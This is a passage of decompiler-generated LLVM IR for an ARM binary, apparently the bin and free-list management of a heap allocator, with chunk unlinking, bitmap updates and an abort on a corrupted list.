  br label %dec_label_pc_10c78

dec_label_pc_10c68.preheader:                     ; preds = %dec_label_pc_10c44
  %v2_10c54 = or i32 %v0_10c4c, 1
  store i32 %v2_10c54, i32* %r2.global-to-local, align 4
  %v1_10c68182 = add i32 %v3_10c38, 4
  %v2_10c68183 = inttoptr i32 %v1_10c68182 to i32*
  %v3_10c68184 = load i32, i32* %v2_10c68183, align 4
  store i32 %v3_10c68184, i32* %r3.global-to-local, align 4
  %v3_10c6c186 = icmp ult i32 %v2_10c54, %v3_10c68184
  br i1 %v3_10c6c186, label %dec_label_pc_10c64, label %dec_label_pc_10c74

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c68.preheader, %dec_label_pc_10c64
  %v0_10c74187 = phi i32 [ %v3_10c64, %dec_label_pc_10c64 ], [ %v3_10c38, %dec_label_pc_10c68.preheader ]
  %v1_10c64 = add i32 %v0_10c74187, 8
  %v2_10c64 = inttoptr i32 %v1_10c64 to i32*
  %v3_10c64 = load i32, i32* %v2_10c64, align 4
  store i32 %v3_10c64, i32* @lr, align 4
  %v1_10c68 = add i32 %v3_10c64, 4
  %v2_10c68 = inttoptr i32 %v1_10c68 to i32*
  %v3_10c68 = load i32, i32* %v2_10c68, align 4
  store i32 %v3_10c68, i32* %r3.global-to-local, align 4
  %v3_10c6c = icmp ult i32 %v2_10c54, %v3_10c68
  br i1 %v3_10c6c, label %dec_label_pc_10c64, label %dec_label_pc_10c74

dec_label_pc_10c74:                               ; preds = %dec_label_pc_10c64, %dec_label_pc_10c68.preheader
  %v0_10c74.lcssa = phi i32 [ %v3_10c38, %dec_label_pc_10c68.preheader ], [ %v3_10c64, %dec_label_pc_10c64 ]
  %v1_10c74 = add i32 %v0_10c74.lcssa, 12
  %v2_10c74 = inttoptr i32 %v1_10c74 to i32*
  %v3_10c74 = load i32, i32* %v2_10c74, align 4
  store i32 %v3_10c74, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10c78

dec_label_pc_10c78:                               ; preds = %.thread, %dec_label_pc_10c20, %dec_label_pc_10c04, %dec_label_pc_10c74
  %v0_10c98 = phi i32 [ %v1_10c34, %dec_label_pc_10c20 ], [ %v1_10c14, %dec_label_pc_10c04 ], [ %v3_10c74, %dec_label_pc_10c74 ], [ %v3_10c44, %.thread ]
  %v0_10c8c = phi i32 [ %v1_10c24, %dec_label_pc_10c20 ], [ %v3_10c0c, %dec_label_pc_10c04 ], [ %v1_10c24, %dec_label_pc_10c74 ], [ %v1_10c24, %.thread ]
  %v1_10c7c = phi i32 [ %v1_10c2c, %dec_label_pc_10c20 ], [ %v1_10c08, %dec_label_pc_10c04 ], [ %v1_10c2c, %dec_label_pc_10c74 ], [ %v1_10c2c, %.thread ]
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  %v2_10c7c = add i32 %v1_10c7c, ptrtoint (i32* @global_var_20cf4.602 to i32)
  %v3_10c7c = inttoptr i32 %v2_10c7c to i32*
  %v4_10c7c = load i32, i32* %v3_10c7c, align 4
  %v3_10c80 = sdiv i32 %v0_10c8c, 32
  store i32 %v3_10c80, i32* %r3.global-to-local, align 4
  %v4_10c84 = mul nsw i32 %v3_10c80, 4
  %v5_10c84 = add i32 %v4_10c7c, %v4_10c84
  store i32 %v5_10c84, i32* %r1.global-to-local, align 4
  %v1_10c88 = add i32 %v5_10c84, 820
  %v2_10c88 = inttoptr i32 %v1_10c88 to i32*
  %v3_10c88 = load i32, i32* %v2_10c88, align 4
  %v1_10c8c = urem i32 %v0_10c8c, 32
  store i32 %v1_10c8c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_10c94 = shl i32 1, %v1_10c8c
  %v8_10c94 = or i32 %v3_10c88, %v7_10c94
  store i32 %v8_10c94, i32* %r3.global-to-local, align 4
  %v1_10c98 = load i32, i32* @r6, align 4
  %v2_10c98 = add i32 %v1_10c98, 12
  %v3_10c98 = inttoptr i32 %v2_10c98 to i32*
  store i32 %v0_10c98, i32* %v3_10c98, align 4
  %v0_10c9c = load i32, i32* @lr, align 4
  %v1_10c9c = load i32, i32* @r6, align 4
  %v2_10c9c = add i32 %v1_10c9c, 8
  %v3_10c9c = inttoptr i32 %v2_10c9c to i32*
  store i32 %v0_10c9c, i32* %v3_10c9c, align 4
  %v0_10ca0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10ca0 = load i32, i32* %r1.global-to-local, align 4
  %v2_10ca0 = add i32 %v1_10ca0, 820
  %v3_10ca0 = inttoptr i32 %v2_10ca0 to i32*
  store i32 %v0_10ca0, i32* %v3_10ca0, align 4
  %v0_10ca4 = load i32, i32* @r6, align 4
  %v1_10ca4 = load i32, i32* @lr, align 4
  %v2_10ca4 = add i32 %v1_10ca4, 12
  %v3_10ca4 = inttoptr i32 %v2_10ca4 to i32*
  store i32 %v0_10ca4, i32* %v3_10ca4, align 4
  %v0_10ca8 = load i32, i32* @r6, align 4
  %v1_10ca8 = load i32, i32* %ip.global-to-local, align 4
  %v2_10ca8 = add i32 %v1_10ca8, 8
  %v3_10ca8 = inttoptr i32 %v2_10ca8 to i32*
  store i32 %v0_10ca8, i32* %v3_10ca8, align 4
  %v0_10cc4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10cc4

dec_label_pc_10cb0:                               ; preds = %dec_label_pc_10b50, %dec_label_pc_10b08, %dec_label_pc_10b64
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r1.global-to-local, align 4
  %v4_10cb8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_10cb8, i32* @sb, align 4
  %v0_10cbc = load i32, i32* @sl, align 4
  %v1_10cbc = add i32 %v0_10cbc, 16
  store i32 %v1_10cbc, i32* @fp, align 4
  %v1_10cc0 = add i32 %v4_10cb8, 52
  store i32 %v1_10cc0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10cc4

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_10c78, %dec_label_pc_10cb0
  %v0_10be4 = phi i32 [ %v0_10cc4.pre, %dec_label_pc_10c78 ], [ %v1_10cc0, %dec_label_pc_10cb0 ]
  %v1_10cc4 = add i32 %v0_10be4, 12
  %v2_10cc4 = inttoptr i32 %v1_10cc4 to i32*
  %v3_10cc4 = load i32, i32* %v2_10cc4, align 4
  store i32 %v3_10cc4, i32* @r6, align 4
  %v9_10cc8 = icmp eq i32 %v3_10cc4, %v0_10be4
  br i1 %v9_10cc8, label %dec_label_pc_10cd0, label %dec_label_pc_10b78

dec_label_pc_10cd0:                               ; preds = %dec_label_pc_10cc4
  %v0_10cd0 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_10cd0, 256
  %v0_10d88.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_10cd0.dec_label_pc_10d88_crit_edge, label %dec_label_pc_10cd8

dec_label_pc_10cd0.dec_label_pc_10d88_crit_edge:  ; preds = %dec_label_pc_10cd0
  %.pre203 = mul i32 %v0_10d88.pre, 8
  br label %dec_label_pc_10d88

dec_label_pc_10cd8:                               ; preds = %dec_label_pc_10cd0
  %v4_10cd8 = mul i32 %v0_10d88.pre, 8
  %v5_10cd8 = add i32 %v4_10cd8, %v0_10be4
  store i32 %v5_10cd8, i32* %r3.global-to-local, align 4
  %v1_10cdc = add i32 %v5_10cd8, -8
  store i32 %v1_10cdc, i32* %r1.global-to-local, align 4
  %v1_10ce0 = add i32 %v5_10cd8, 4
  %v2_10ce0 = inttoptr i32 %v1_10ce0 to i32*
  %storemerge.pre = load i32, i32* %v2_10ce0, align 4
  br label %dec_label_pc_10d80

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10d80
  %v1_10ce8 = add i32 %v1_10d10, 4
  %v2_10ce8 = inttoptr i32 %v1_10ce8 to i32*
  %v3_10ce8 = load i32, i32* %v2_10ce8, align 4
  store i32 %v3_10ce8, i32* %r3.global-to-local, align 4
  %v1_10cec = and i32 %v3_10ce8, -4
  store i32 %v1_10cec, i32* %r2.global-to-local, align 4
  %v3_10cf0 = icmp ult i32 %v1_10cec, %v0_10cd0
  %v1_10cf4 = add i32 %v1_10d10, 12
  %v2_10cf4 = inttoptr i32 %v1_10cf4 to i32*
  %v3_10cf4 = load i32, i32* %v2_10cf4, align 4
  store i32 %v3_10cf4, i32* %r0.global-to-local, align 4
  br i1 %v3_10cf0, label %dec_label_pc_10d80, label %dec_label_pc_10cfc

dec_label_pc_10cfc:                               ; preds = %dec_label_pc_10ce8
  %v1_10cfc = add i32 %v1_10d10, 8
  %v2_10cfc = inttoptr i32 %v1_10cfc to i32*
  %v3_10cfc = load i32, i32* %v2_10cfc, align 4
  store i32 %v3_10cfc, i32* %r1.global-to-local, align 4
  %v1_10d00 = add i32 %v3_10cfc, 12
  %v2_10d00 = inttoptr i32 %v1_10d00 to i32*
  %v3_10d00 = load i32, i32* %v2_10d00, align 4
  store i32 %v3_10d00, i32* %r3.global-to-local, align 4
  %v9_10d04 = icmp eq i32 %v3_10d00, %v1_10d10
  br i1 %v9_10d04, label %dec_label_pc_10d0c, label %dec_label_pc_10d18

dec_label_pc_10d0c:                               ; preds = %dec_label_pc_10cfc
  %v1_10d0c = add i32 %v3_10cf4, 8
  %v2_10d0c = inttoptr i32 %v1_10d0c to i32*
  %v3_10d0c = load i32, i32* %v2_10d0c, align 4
  store i32 %v3_10d0c, i32* %r3.global-to-local, align 4
  %v9_10d10 = icmp eq i32 %v3_10d0c, %v1_10d10
  br i1 %v9_10d10, label %dec_label_pc_10d1c, label %dec_label_pc_10d18

dec_label_pc_10d18:                               ; preds = %dec_label_pc_10cfc, %dec_label_pc_10d0c
  %v0_10d18 = call i32 @abort()
  store i32 %v0_10d18, i32* %r0.global-to-local, align 4
  %v0_10d1c.pre = load i32, i32* @sl, align 4
  %v1_10d1c.pre = load i32, i32* @r2, align 4
  %v0_10d24.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_10d1c

dec_label_pc_10d1c:                               ; preds = %dec_label_pc_10d0c, %dec_label_pc_10d18
  %v1_10d24 = phi i32 [ %v3_10cf4, %dec_label_pc_10d0c ], [ %v0_10d18, %dec_label_pc_10d18 ]
  %v0_10d24 = phi i32 [ %v3_10cfc, %dec_label_pc_10d0c ], [ %v0_10d24.pre, %dec_label_pc_10d18 ]
  %v1_10d1c = phi i32 [ %v1_10cec, %dec_label_pc_10d0c ], [ %v1_10d1c.pre, %dec_label_pc_10d18 ]
  %v0_10d1c = phi i32 [ %v0_10cd0, %dec_label_pc_10d0c ], [ %v0_10d1c.pre, %dec_label_pc_10d18 ]
  %v2_10d1c = sub i32 %v1_10d1c, %v0_10d1c
  store i32 %v2_10d1c, i32* %lr.global-to-local, align 4
  %v2_10d24 = add i32 %v1_10d24, 8
  %v3_10d24 = inttoptr i32 %v2_10d24 to i32*
  store i32 %v0_10d24, i32* %v3_10d24, align 4
  %v0_10d28 = load i32, i32* %r0.global-to-local, align 4
  %v1_10d28 = load i32, i32* %r1.global-to-local, align 4
  %v2_10d28 = add i32 %v1_10d28, 12
  %v3_10d28 = inttoptr i32 %v2_10d28 to i32*
  store i32 %v0_10d28, i32* %v3_10d28, align 4
  %v0_10d2c = load i32, i32* %ip.global-to-local, align 4
  %v1_10d2c = add i32 %v0_10d2c, 8
  store i32 %v1_10d2c, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_10d1c, 15
  br i1 %tmp210, label %dec_label_pc_10d4c, label %dec_label_pc_10d34

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10d1c
  %v1_10d34 = load i32, i32* %r2.global-to-local, align 4
  %v2_10d34 = add i32 %v1_10d34, %v0_10d2c
  store i32 %v2_10d34, i32* %r2.global-to-local, align 4
  %v1_10d38 = add i32 %v2_10d34, 4
  %v2_10d38 = inttoptr i32 %v1_10d38 to i32*
  %v3_10d38 = load i32, i32* %v2_10d38, align 4
  store i32 %v3_10d38, i32* %r3.global-to-local, align 4
  store i32 %v1_10d2c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10d40

dec_label_pc_10d40.loopexit:                      ; preds = %dec_label_pc_10be0
  %v1_10bec = load i32, i32* @r6, align 4
  %v2_10bec = load i32, i32* @sl, align 4
  %v3_10bec = add i32 %v2_10bec, %v1_10bec
  store i32 %v3_10bec, i32* %r2.global-to-local, align 4
  %v2_10bf0 = add i32 %v3_10bec, 4
  %v3_10bf0 = inttoptr i32 %v2_10bf0 to i32*
  %v4_10bf0 = load i32, i32* %v3_10bf0, align 4
  store i32 %v4_10bf0, i32* %r3.global-to-local, align 4
  %v2_10bf4 = add i32 %v1_10bec, 8
  store i32 %v2_10bf4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10d40

dec_label_pc_10d40:                               ; preds = %.dec_label_pc_10d40_crit_edge, %dec_label_pc_10d40.loopexit, %dec_label_pc_10d34
  %v1_10d44 = phi i32 [ %v4_10e68, %.dec_label_pc_10d40_crit_edge ], [ %v3_10bec, %dec_label_pc_10d40.loopexit ], [ %v2_10d34, %dec_label_pc_10d34 ]
  %v0_10d40 = phi i32 [ %v7_10e68, %.dec_label_pc_10d40_crit_edge ], [ %v4_10bf0, %dec_label_pc_10d40.loopexit ], [ %v3_10d38, %dec_label_pc_10d34 ]
  %v1_10d40 = or i32 %v0_10d40, 1
  store i32 %v1_10d40, i32* %r3.global-to-local, align 4
  %v2_10d44 = add i32 %v1_10d44, 4
  %v3_10d44 = inttoptr i32 %v2_10d44 to i32*
  store i32 %v1_10d40, i32* %v3_10d44, align 4
  br label %dec_label_pc_11308

dec_label_pc_10d4c:                               ; preds = %dec_label_pc_10d1c
  %v1_10d4c = load i32, i32* @sl, align 4
  %v2_10d4c = add i32 %v1_10d4c, %v0_10d2c
  store i32 %v2_10d4c, i32* %r2.global-to-local, align 4
  %v1_10d50 = or i32 %v1_10d4c, 1
  store i32 %v1_10d50, i32* %r3.global-to-local, align 4
  %v0_10d54 = load i32, i32* %lr.global-to-local, align 4
  %v1_10d54 = or i32 %v0_10d54, 1
  store i32 %v1_10d54, i32* %r1.global-to-local, align 4
  store i32 %v1_10d2c, i32* %r4.global-to-local, align 4
  %v2_10d5c = add i32 %v0_10d2c, 4
  %v3_10d5c = inttoptr i32 %v2_10d5c to i32*
  store i32 %v1_10d50, i32* %v3_10d5c, align 4
  %v0_10d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_10d60 = load i32, i32* @r6, align 4
  %v2_10d60 = add i32 %v1_10d60, 8
  %v3_10d60 = inttoptr i32 %v2_10d60 to i32*
  store i32 %v0_10d60, i32* %v3_10d60, align 4
  %v0_10d64 = load i32, i32* %r2.global-to-local, align 4
  %v1_10d64 = load i32, i32* @r6, align 4
  %v2_10d64 = add i32 %v1_10d64, 12
  %v3_10d64 = inttoptr i32 %v2_10d64 to i32*
  store i32 %v0_10d64, i32* %v3_10d64, align 4
  %v0_10d68 = load i32, i32* %lr.global-to-local, align 4
  %v1_10d68 = load i32, i32* %r2.global-to-local, align 4
  %v3_10d68 = add i32 %v1_10d68, %v0_10d68
  %v4_10d68 = inttoptr i32 %v3_10d68 to i32*
  store i32 %v0_10d68, i32* %v4_10d68, align 4
  %v0_10d6c = load i32, i32* %r1.global-to-local, align 4
  %v1_10d6c = load i32, i32* %r2.global-to-local, align 4
  %v2_10d6c = add i32 %v1_10d6c, 4
  %v3_10d6c = inttoptr i32 %v2_10d6c to i32*
  store i32 %v0_10d6c, i32* %v3_10d6c, align 4
  %v0_10d70 = load i32, i32* @r6, align 4
  %v1_10d70 = load i32, i32* %r2.global-to-local, align 4
  %v2_10d70 = add i32 %v1_10d70, 12
  %v3_10d70 = inttoptr i32 %v2_10d70 to i32*
  store i32 %v0_10d70, i32* %v3_10d70, align 4
  %v0_10d74 = load i32, i32* @r6, align 4
  %v1_10d74 = load i32, i32* %r2.global-to-local, align 4
  %v2_10d74 = add i32 %v1_10d74, 8
  %v3_10d74 = inttoptr i32 %v2_10d74 to i32*
  store i32 %v0_10d74, i32* %v3_10d74, align 4
  br label %dec_label_pc_11308

dec_label_pc_10d80:                               ; preds = %dec_label_pc_10ce8, %dec_label_pc_10cd8
  %v1_10d10 = phi i32 [ %storemerge.pre, %dec_label_pc_10cd8 ], [ %v3_10cf4, %dec_label_pc_10ce8 ]
  store i32 %v1_10d10, i32* %ip.global-to-local, align 4
  %v9_10d80 = icmp eq i32 %v1_10d10, %v1_10cdc
  br i1 %v9_10d80, label %dec_label_pc_10d88.loopexit, label %dec_label_pc_10ce8

dec_label_pc_10d88.loopexit:                      ; preds = %dec_label_pc_10d80
  br label %dec_label_pc_10d88

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10cd0.dec_label_pc_10d88_crit_edge, %dec_label_pc_10d88.loopexit
  %v4_10db8.pre-phi = phi i32 [ %.pre203, %dec_label_pc_10cd0.dec_label_pc_10d88_crit_edge ], [ %v4_10cd8, %dec_label_pc_10d88.loopexit ]
  %v1_10d88 = add i32 %v0_10d88.pre, 1
  store i32 %v1_10d88, i32* %r2.global-to-local, align 4
  %v1_10d8c = urem i32 %v1_10d88, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r0.global-to-local, align 4
  %v6_10d98 = shl i32 1, %v1_10d8c
  store i32 %v6_10d98, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_10da0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_10da0, i32* %r3.global-to-local, align 4
  %v3_10da4 = udiv i32 %v1_10d88, 32
  store i32 %v3_10da4, i32* @r5, align 4
  %v4_10da8 = mul nuw nsw i32 %v3_10da4, 4
  %v5_10da8 = add i32 %v4_10da0, %v4_10da8
  store i32 %v5_10da8, i32* %r2.global-to-local, align 4
  %v1_10dac = add i32 %v5_10da8, 820
  %v2_10dac = inttoptr i32 %v1_10dac to i32*
  %v3_10dac = load i32, i32* %v2_10dac, align 4
  store i32 %v3_10dac, i32* @r4, align 4
  %v1_10db0 = add i32 %v4_10da0, 52
  store i32 %v1_10db0, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_10db8 = add i32 %v1_10db0, %v4_10db8.pre-phi
  store i32 %v5_10db8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10dbc

dec_label_pc_10dbc:                               ; preds = %dec_label_pc_10e24, %dec_label_pc_10d88
  %v1_10dc4 = phi i32 [ %v1_10dc4.pre, %dec_label_pc_10e24 ], [ %v3_10dac, %dec_label_pc_10d88 ]
  %v0_10dc4 = phi i32 [ %v0_10dbc.pre, %dec_label_pc_10e24 ], [ %v6_10d98, %dec_label_pc_10d88 ]
  %v1_10dbc = sub i32 1, %v0_10dc4
  %v2_10dbc = icmp ult i32 %v0_10dc4, 2
  %v1_10dbc. = select i1 %v2_10dbc, i32 %v1_10dbc, i32 0
  store i32 %v1_10dbc., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_10dc4, %v1_10dc4
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_10dbc
  %v5_10dc8 = or i32 %v1_10dbc., 1
  store i32 %v5_10dc8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10dd4.preheader

bb145:                                            ; preds = %dec_label_pc_10dbc
  %v2_10dcc = icmp eq i32 %v1_10dbc., 0
  br i1 %v2_10dcc, label %.dec_label_pc_10e10.preheader_crit_edge, label %dec_label_pc_10dd4.preheader

.dec_label_pc_10e10.preheader_crit_edge:          ; preds = %bb145
  %v0_10e0857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e10.preheader

dec_label_pc_10dd4.preheader:                     ; preds = %bb145, %.thread15
  %v0_10dd4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10dd4

dec_label_pc_10dd4:                               ; preds = %dec_label_pc_10dd4.preheader, %dec_label_pc_10de0
  %v0_10dd4 = phi i32 [ %v0_10dd4.pre, %dec_label_pc_10dd4.preheader ], [ %v1_10dd4, %dec_label_pc_10de0 ]
  %v1_10dd4 = add i32 %v0_10dd4, 1
  store i32 %v1_10dd4, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_10dd4, 2
  br i1 %tmp211, label %dec_label_pc_10eb4.loopexit, label %dec_label_pc_10de0

dec_label_pc_10de0:                               ; preds = %dec_label_pc_10dd4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r3.global-to-local, align 4
  %v1_10de4 = load i32, i32* @r8, align 4
  %v2_10de4 = add i32 %v1_10de4, ptrtoint (i32* @global_var_20cf4.602 to i32)
  %v3_10de4 = inttoptr i32 %v2_10de4 to i32*
  %v4_10de4 = load i32, i32* %v3_10de4, align 4
  store i32 %v4_10de4, i32* %r2.global-to-local, align 4
  %v4_10de8 = mul i32 %v1_10dd4, 4
  %v5_10de8 = add i32 %v4_10de4, %v4_10de8
  store i32 %v5_10de8, i32* %r3.global-to-local, align 4
  %v1_10dec = add i32 %v5_10de8, 820
  %v2_10dec = inttoptr i32 %v1_10dec to i32*
  %v3_10dec = load i32, i32* %v2_10dec, align 4
  store i32 %v3_10dec, i32* @r4, align 4
  %v2_10df0 = icmp eq i32 %v3_10dec, 0
  br i1 %v2_10df0, label %dec_label_pc_10dd4, label %dec_label_pc_10df8

dec_label_pc_10df8:                               ; preds = %dec_label_pc_10de0
  %v4_10df8 = mul i32 %v1_10dd4, 256
  %v5_10df8 = add i32 %v4_10de4, %v4_10df8
  store i32 %v5_10df8, i32* %r3.global-to-local, align 4
  %v1_10dfc = add i32 %v5_10df8, 44
  store i32 %v1_10dfc, i32* %r0.global-to-local, align 4
  %v0_10e00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10e00, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10e10.preheader

dec_label_pc_10e10.preheader:                     ; preds = %.dec_label_pc_10e10.preheader_crit_edge, %dec_label_pc_10df8
  %v0_10e0857 = phi i32 [ %v1_10dfc, %dec_label_pc_10df8 ], [ %v0_10e0857.pre, %.dec_label_pc_10e10.preheader_crit_edge ]
  %v0_10e2c = phi i32 [ %v3_10dec, %dec_label_pc_10df8 ], [ %v1_10dc4, %.dec_label_pc_10e10.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_10e00, %dec_label_pc_10df8 ], [ %v0_10dc4, %.dec_label_pc_10e10.preheader_crit_edge ]
  %v2_10e1054 = and i32 %ip.promoted, %v0_10e2c
  %v4_10e1056 = icmp eq i32 %v2_10e1054, 0
  br i1 %v4_10e1056, label %dec_label_pc_10e08, label %dec_label_pc_10e18

dec_label_pc_10e08:                               ; preds = %dec_label_pc_10e10.preheader, %dec_label_pc_10e08
  %v2_10e0c59 = phi i32 [ %v2_10e0c, %dec_label_pc_10e08 ], [ %ip.promoted, %dec_label_pc_10e10.preheader ]
  %v0_10e0858 = phi i32 [ %v1_10e08, %dec_label_pc_10e08 ], [ %v0_10e0857, %dec_label_pc_10e10.preheader ]
  %v1_10e08 = add i32 %v0_10e0858, 8
  %v2_10e0c = mul i32 %v2_10e0c59, 2
  %v2_10e10 = and i32 %v2_10e0c, %v0_10e2c
  %v4_10e10 = icmp eq i32 %v2_10e10, 0
  br i1 %v4_10e10, label %dec_label_pc_10e08, label %dec_label_pc_10e10.dec_label_pc_10e18_crit_edge

dec_label_pc_10e10.dec_label_pc_10e18_crit_edge:  ; preds = %dec_label_pc_10e08
  store i32 %v1_10e08, i32* %r0.global-to-local, align 4
  store i32 %v2_10e0c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10e18

dec_label_pc_10e18:                               ; preds = %dec_label_pc_10e10.dec_label_pc_10e18_crit_edge, %dec_label_pc_10e10.preheader
  %v0_10e38 = phi i32 [ %v2_10e0c, %dec_label_pc_10e10.dec_label_pc_10e18_crit_edge ], [ %ip.promoted, %dec_label_pc_10e10.preheader ]
  %v0_10e5c = phi i32 [ %v1_10e08, %dec_label_pc_10e10.dec_label_pc_10e18_crit_edge ], [ %v0_10e0857, %dec_label_pc_10e10.preheader ]
  %v1_10e18 = add i32 %v0_10e5c, 12
  %v2_10e18 = inttoptr i32 %v1_10e18 to i32*
  %v3_10e18 = load i32, i32* %v2_10e18, align 4
  store i32 %v3_10e18, i32* @lr, align 4
  %v9_10e1c = icmp eq i32 %v3_10e18, %v0_10e5c
  br i1 %v9_10e1c, label %dec_label_pc_10e24, label %dec_label_pc_10e44

dec_label_pc_10e24:                               ; preds = %dec_label_pc_10e18
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r0.global-to-local, align 4
  %v1_10e28 = load i32, i32* @r8, align 4
  %v2_10e28 = add i32 %v1_10e28, ptrtoint (i32* @global_var_20cf4.602 to i32)
  %v3_10e28 = inttoptr i32 %v2_10e28 to i32*
  %v4_10e28 = load i32, i32* %v3_10e28, align 4
  %v2_10e2c = sub i32 -1, %v0_10e38
  %v3_10e2c = and i32 %v0_10e2c, %v2_10e2c
  store i32 %v3_10e2c, i32* @r4, align 4
  %v1_10e30 = load i32, i32* @r5, align 4
  %v4_10e30 = mul i32 %v1_10e30, 4
  %v5_10e30 = add i32 %v4_10e30, %v4_10e28
  store i32 %v5_10e30, i32* %r3.global-to-local, align 4
  %v1_10e34 = add i32 %v0_10e5c, 8
  store i32 %v1_10e34, i32* %r0.global-to-local, align 4
  %v2_10e38 = mul i32 %v0_10e38, 2
  store i32 %v2_10e38, i32* %ip.global-to-local, align 4
  %v2_10e3c = add i32 %v5_10e30, 820
  %v3_10e3c = inttoptr i32 %v2_10e3c to i32*
  store i32 %v3_10e2c, i32* %v3_10e3c, align 4
  %v0_10dbc.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_10dc4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10dbc

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e18
  %v1_10e44 = add i32 %v3_10e18, 4
  %v2_10e44 = inttoptr i32 %v1_10e44 to i32*
  %v3_10e44 = load i32, i32* %v2_10e44, align 4
  store i32 %v3_10e44, i32* %r3.global-to-local, align 4
  %v1_10e48 = and i32 %v3_10e44, -4
  store i32 %v1_10e48, i32* %r2.global-to-local, align 4
  %v0_10e4c = load i32, i32* @sl, align 4
  %v2_10e4c = sub i32 %v1_10e48, %v0_10e4c
  store i32 %v2_10e4c, i32* %ip.global-to-local, align 4
  %v1_10e50 = add i32 %v3_10e18, 12
  %v2_10e50 = inttoptr i32 %v1_10e50 to i32*
  %v3_10e50 = load i32, i32* %v2_10e50, align 4
  store i32 %v3_10e50, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_10e4c, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_10e44
  %v6_10e58 = add i32 %v1_10e48, %v3_10e18
  store i32 %v6_10e58, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_10e44, %bb146
  %v2_10e5c = add i32 %v3_10e50, 8
  %v3_10e5c = inttoptr i32 %v2_10e5c to i32*
  store i32 %v0_10e5c, i32* %v3_10e5c, align 4
  %v0_10e60 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e60 = load i32, i32* %r0.global-to-local, align 4
  %v2_10e60 = add i32 %v1_10e60, 12
  %v3_10e60 = inttoptr i32 %v2_10e60 to i32*
  store i32 %v0_10e60, i32* %v3_10e60, align 4
  %v4_10e64 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_10d40_crit_edge, label %dec_label_pc_10e70

.dec_label_pc_10d40_crit_edge:                    ; preds = %bb147
  %v5_10e64 = add i32 %v4_10e64, 8
  store i32 %v5_10e64, i32* %r4.global-to-local, align 4
  %v4_10e68 = load i32, i32* %r2.global-to-local, align 4
  %v5_10e68 = add i32 %v4_10e68, 4
  %v6_10e68 = inttoptr i32 %v5_10e68 to i32*
  %v7_10e68 = load i32, i32* %v6_10e68, align 4
  store i32 %v7_10e68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10d40

dec_label_pc_10e70:                               ; preds = %bb147
  %v1_10e70 = load i32, i32* @sl, align 4
  %v2_10e70 = add i32 %v1_10e70, %v4_10e64
  store i32 %v2_10e70, i32* %r1.global-to-local, align 4
  %v1_10e78 = load i32, i32* @r6, align 4
  %v2_10e78 = add i32 %v1_10e78, 8
  %v3_10e78 = inttoptr i32 %v2_10e78 to i32*
  store i32 %v2_10e70, i32* %v3_10e78, align 4
  %v0_10e7c = load i32, i32* %r1.global-to-local, align 4
  %v1_10e7c = load i32, i32* @r6, align 4
  %v2_10e7c = add i32 %v1_10e7c, 12
  %v3_10e7c = inttoptr i32 %v2_10e7c to i32*
  store i32 %v0_10e7c, i32* %v3_10e7c, align 4
  %v0_10e80 = load i32, i32* @r6, align 4
  %v1_10e80 = load i32, i32* %r1.global-to-local, align 4
  %v2_10e80 = add i32 %v1_10e80, 8
  %v3_10e80 = inttoptr i32 %v2_10e80 to i32*
  store i32 %v0_10e80, i32* %v3_10e80, align 4
  %v0_10e84 = load i32, i32* @r6, align 4
  %v1_10e84 = load i32, i32* %r1.global-to-local, align 4
  %v2_10e84 = add i32 %v1_10e84, 12
  %v3_10e84 = inttoptr i32 %v2_10e84 to i32*
  store i32 %v0_10e84, i32* %v3_10e84, align 4
  %tmp213 = icmp ult i32 %v1_10e70, 256
  br i1 %tmp213, label %bb148, label %.thread124

